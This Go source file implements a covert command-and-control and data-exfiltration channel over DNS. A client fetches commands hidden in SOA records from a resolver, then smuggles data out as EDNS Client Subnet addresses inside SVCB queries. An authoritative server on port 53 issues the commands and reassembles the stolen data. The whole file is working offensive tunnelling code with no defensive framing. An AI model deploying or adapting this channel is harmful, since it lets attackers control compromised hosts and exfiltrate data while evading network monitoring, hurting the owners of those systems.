package protocol

import (
	"fmt"
	"net"
	"strings"
	"time"

	"github.com/kek/pek/internal/codec"
	"github.com/miekg/dns"
)

type EcsProtoClient struct {
	codec    codec.Codec[net.IP]
	resolver string
	domain   string
	delay    time.Duration
}

func NewEcsProtoClient(resolver string, domain string, delay time.Duration) *EcsProtoClient {
	return &EcsProtoClient{
		codec:    codec.NewEcsCodec(),
		resolver: resolver,
		domain:   domain,
		delay:    delay,
	}
}

func (proto *EcsProtoClient) FetchCmd() (string, error) {
	cmdResponse, err := proto.resolve(dns.TypeSOA, nil)
	if err != nil {
		return "", err
	}

	if len(cmdResponse) == 1 {
		if cmdRecord, ok := cmdResponse[0].(*dns.SOA); ok {
			decoded, err := proto.codec.DecodeCmd(cmdRecord.Ns)
			if err != nil {
				return "", fmt.Errorf("Unexpected content of SOA record")
			}

			return string(decoded), nil
		} else {
			return "", fmt.Errorf("Unexpected response instead of SOA record")
		}
	}

	return "", fmt.Errorf("Unexpected amount of DNS answers")
}

func (proto *EcsProtoClient) Send(data []byte) error {
	encodedData := proto.codec.Encode(data)
	counter := 0
	for _, part := range encodedData {
		fmt.Printf("Sending: %v ... ", part)
		for {
			time.Sleep(proto.delay)

			answer, err := proto.resolve(dns.TypeSVCB, part)
			if err != nil {
				continue
			}

			counter++

			if len(answer) > 0 {
				if record, ok := answer[0].(*dns.SVCB); ok {
					if strings.Contains(record.Target, part.String()) {
						fmt.Printf("OK\n")
						break
					}
				}
			}
		}
	}
	fmt.Printf("Done in %d requests.\n\n", counter)

	return nil
}

func (proto *EcsProtoClient) resolve(qtype uint16, subnet net.IP) ([]dns.RR, error) {
	m := new(dns.Msg)

	m.SetQuestion(dns.Fqdn(proto.domain), qtype)
	m.RecursionDesired = true
	m.CheckingDisabled = true

	if subnet != nil {
		o := &dns.OPT{
			Hdr: dns.RR_Header{
				Name:   ".",
				Rrtype: dns.TypeOPT,
			},
		}

		e := &dns.EDNS0_SUBNET{
			Code:          dns.EDNS0SUBNET,
			Address:       subnet,
			Family:        1,
			SourceNetmask: 24,
		}

		o.Option = append(o.Option, e)
		m.Extra = append(m.Extra, o)
		o.SetUDPSize(512)
	}

	c := &dns.Client{Timeout: 1 * time.Second}

	response, _, err := c.Exchange(m, proto.resolver)
	if err != nil {
		return nil, err
	}

	return response.Answer, nil
}

type EcsProtoServer struct {
	codec     codec.Codec[net.IP]
	cmd       string
	listening bool
	c         chan net.IP
}

func NewEcsProtoServer() *EcsProtoServer {
	return &EcsProtoServer{
		codec: codec.NewEcsCodec(),
		c:     make(chan net.IP, 10),
	}
}

func (proto *EcsProtoServer) serverHandler(w dns.ResponseWriter, r *dns.Msg) {
	msg := new(dns.Msg)
	msg.SetReply(r)
	msg.Authoritative = true

	ip := net.ParseIP("0.0.0.0")
	mask := uint8(0)
	size := uint16(512)

	switch r.Question[0].Qtype {
	case dns.TypeSOA:
		msg.Answer = append(msg.Answer, &dns.SOA{
			Hdr:     dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeSOA, Class: dns.ClassINET, Ttl: 0},
			Ns:      proto.codec.EncodeCmd(proto.cmd),
			Mbox:    "kek.pek.",
			Serial:  3,
			Refresh: 1,
			Retry:   3,
			Expire:  3,
			Minttl:  7,
		})

		if proto.cmd != "" {
			fmt.Println("Command received")
		}
	default:
		if edns := r.IsEdns0(); edns != nil {
			for _, opt := range edns.Option {
				if subnet, ok := opt.(*dns.EDNS0_SUBNET); ok {
					ip = subnet.Address
					mask = uint8(24)
					size = edns.UDPSize()

					if proto.listening {
						proto.c <- ip
					}

					break
				}
			}
		}

		msg.Answer = append(msg.Answer, &dns.SVCB{
			Hdr:    dns.RR_Header{Name: r.Question[0].Name, Rrtype: dns.TypeSVCB, Class: dns.ClassINET, Ttl: 0},
			Target: fmt.Sprintf("%s.", ip),
		})
	}

	o := new(dns.OPT)
	o.SetUDPSize(size)
	o.Hdr.Name = "."
	o.Hdr.Rrtype = dns.TypeOPT
	e := new(dns.EDNS0_SUBNET)
	e.Code = dns.EDNS0SUBNET
	e.Family = 1
	e.SourceNetmask = mask
	e.SourceScope = 0
	e.Address = ip

	o.Option = append(o.Option, e)
	msg.Extra = append(msg.Extra, o)

	w.WriteMsg(msg)

}

func (proto *EcsProtoServer) Serve() error {
	mux := dns.NewServeMux()
	mux.HandleFunc(".", proto.serverHandler)

	server := &dns.Server{
		Addr:    ":53",
		Net:     "udp",
		UDPSize: 512,
		Handler: mux,
	}

	return server.ListenAndServe()
}

func (proto *EcsProtoServer) SendCmd(cmd string) {
	proto.cmd = cmd
}

func (proto *EcsProtoServer) FetchData() []byte {
	proto.listening = true

	var buf []net.IP
	for {
		part := <-proto.c
		if part.Equal(proto.codec.GetPrologue()) {
			fmt.Printf("Receiving data")
			buf = nil
		}

		buf = append(buf, part)
		fmt.Printf(".")

		if part.Equal(proto.codec.GetEpilogue()) {
			fmt.Printf("\n\n")

			decoded, err := proto.codec.Decode(buf)
			if err != nil {
				fmt.Printf("Error decoding response: %s", err)
			}

			proto.listening = false
			proto.cmd = ""
			return decoded
		}
	}
}
